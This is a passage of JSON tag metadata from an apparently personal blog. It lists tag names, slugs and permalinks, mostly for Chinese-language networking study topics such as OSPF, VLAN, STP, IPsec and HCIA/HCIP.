Totally-NSSA","slug":"OSPF-Totally-NSSA","permalink":"http://sakuramuxia.github.io/tags/OSPF-Totally-NSSA/"},{"name":"批量加入Vlan","slug":"批量加入Vlan","permalink":"http://sakuramuxia.github.io/tags/%E6%89%B9%E9%87%8F%E5%8A%A0%E5%85%A5Vlan/"},{"name":"交换机通过FTP上传下载文件","slug":"交换机通过FTP上传下载文件","permalink":"http://sakuramuxia.github.io/tags/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%80%9A%E8%BF%87FTP%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/"},{"name":"Office激活","slug":"Office激活","permalink":"http://sakuramuxia.github.io/tags/Office%E6%BF%80%E6%B4%BB/"},{"name":"2019激活密钥","slug":"2019激活密钥","permalink":"http://sakuramuxia.github.io/tags/2019%E6%BF%80%E6%B4%BB%E5%AF%86%E9%92%A5/"},{"name":"win10KMS激活","slug":"win10KMS激活","permalink":"http://sakuramuxia.github.io/tags/win10KMS%E6%BF%80%E6%B4%BB/"},{"name":"VIM使用","slug":"VIM使用","permalink":"http://sakuramuxia.github.io/tags/VIM%E4%BD%BF%E7%94%A8/"},{"name":"OSPF内部路由","slug":"OSPF内部路由","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%86%85%E9%83%A8%E8%B7%AF%E7%94%B1/"},{"name":"OSPF多区域","slug":"OSPF多区域","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%A4%9A%E5%8C%BA%E5%9F%9F/"},{"name":"OSPF基础","slug":"OSPF基础","permalink":"http://sakuramuxia.github.io/tags/OSPF%E5%9F%BA%E7%A1%80/"},{"name":"PIM","slug":"PIM","permalink":"http://sakuramuxia.github.io/tags/PIM/"},{"name":"PIM SM","slug":"PIM-SM","permalink":"http://sakuramuxia.github.io/tags/PIM-SM/"},{"name":"PIM DM","slug":"PIM-DM","permalink":"http://sakuramuxia.github.io/tags/PIM-DM/"},{"name":"IGMP Snooping","slug":"IGMP-Snooping","permalink":"http://sakuramuxia.github.io/tags/IGMP-Snooping/"},{"name":"DOS","slug":"DOS","permalink":"http://sakuramuxia.github.io/tags/DOS/"},{"name":"树莓派","slug":"树莓派","permalink":"http://sakuramuxia.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"},{"name":"组播","slug":"组播","permalink":"http://sakuramuxia.github.io/tags/%E7%BB%84%E6%92%AD/"},{"name":"IGMP","slug":"IGMP","permalink":"http://sakuramuxia.github.io/tags/IGMP/"},{"name":"BPDU","slug":"BPDU","permalink":"http://sakuramuxia.github.io/tags/BPDU/"},{"name":"MSTP","slug":"MSTP","permalink":"http://sakuramuxia.github.io/tags/MSTP/"},{"name":"RSTP","slug":"RSTP","permalink":"http://sakuramuxia.github.io/tags/RSTP/"},{"name":"代理ARP","slug":"代理ARP","permalink":"http://sakuramuxia.github.io/tags/%E4%BB%A3%E7%90%86ARP/"},{"name":"MQC流策略","slug":"MQC流策略","permalink":"http://sakuramuxia.github.io/tags/MQC%E6%B5%81%E7%AD%96%E7%95%A5/"},{"name":"SUPER VLAN","slug":"SUPER-VLAN","permalink":"http://sakuramuxia.github.io/tags/SUPER-VLAN/"},{"name":"端口安全","slug":"端口安全","permalink":"http://sakuramuxia.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8/"},{"name":"隔离技术","slug":"隔离技术","permalink":"http://sakuramuxia.github.io/tags/%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF/"},{"name":"MUX VLAN","slug":"MUX-VLAN","permalink":"http://sakuramuxia.github.io/tags/MUX-VLAN/"},{"name":"BFD","slug":"BFD","permalink":"http://sakuramuxia.github.io/tags/BFD/"},{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"VRRP配置","slug":"VRRP配置","permalink":"http://sakuramuxia.github.io/tags/VRRP%E9%85%8D%E7%BD%AE/"},{"name":"VRRP","slug":"VRRP","permalink":"http://sakuramuxia.github.io/tags/VRRP/"},{"name":"防火墙","slug":"防火墙","permalink":"http://sakuramuxia.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Eth-Trunk链路聚合","slug":"Eth-Trunk链路聚合","permalink":"http://sakuramuxia.github.io/tags/Eth-Trunk%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"},{"name":"IPsec 配置","slug":"IPsec-配置","permalink":"http://sakuramuxia.github.io/tags/IPsec-%E9%85%8D%E7%BD%AE/"},{"name":"IPsec VPN","slug":"IPsec-VPN","permalink":"http://sakuramuxia.github.io/tags/IPsec-VPN/"},{"name":"信息安全","slug":"信息安全","permalink":"http://sakuramuxia.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"GRE","slug":"GRE","permalink":"http://sakuramuxia.github.io/tags/GRE/"},{"name":"HCIA","slug":"HCIA","permalink":"http://sakuramuxia.github.io/tags/HCIA/"},{"name":"实验","slug":"实验","permalink":"http://sakuramuxia.github.io/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"PPP","slug":"PPP","permalink":"http://sakuramuxia.github.io/tags/PPP/"},{"name":"NAT","slug":"NAT","permalink":"http://sakuramuxia.github.io/tags/NAT/"},{"name":"ACL","slug":"ACL","permalink":"http://sakuramuxia.github.io/tags/ACL/"},{"name":"DHCP","slug":"DHCP","permalink":"http://sakuramuxia.github.io/tags/DHCP/"},{"name":"STP","slug":"STP","permalink":"http://sakuramuxia.github.io/tags/STP/"},{"name":"VLAN","slug":"VLAN","permalink":"http://sakuramuxia.github.io/tags/VLAN/"},{"name":"GVRP","slug":"GVRP","permalink":"http://sakuramuxia.github.io/tags/GVRP/"},{"name":"笔记","slug":"笔记","permalink":"http://sakuramuxia.github.io/tags/%E7%AC%94%E8%AE%B0/"},{"name":"交换","slug":"交换","permalink":"http://sakuramuxia.github.io/tags/%E4%BA%A4%E6%8D%A2/"},{"name":"OSPF","slug":"OSPF","permalink":"http://sakuramuxia.github.io/tags/OSPF/"},{"name":"RIP","slug":"RIP","permalink":"http://sakuramuxia.github.io/tags/RIP/"},{"name":"ARP","slug":"ARP","permalink":"http://sakuramuxia.github.io/tags/ARP/"},{"name":"java","slug":"java","permalink":"http://sakuramuxia.github.io/tags/java/"}]}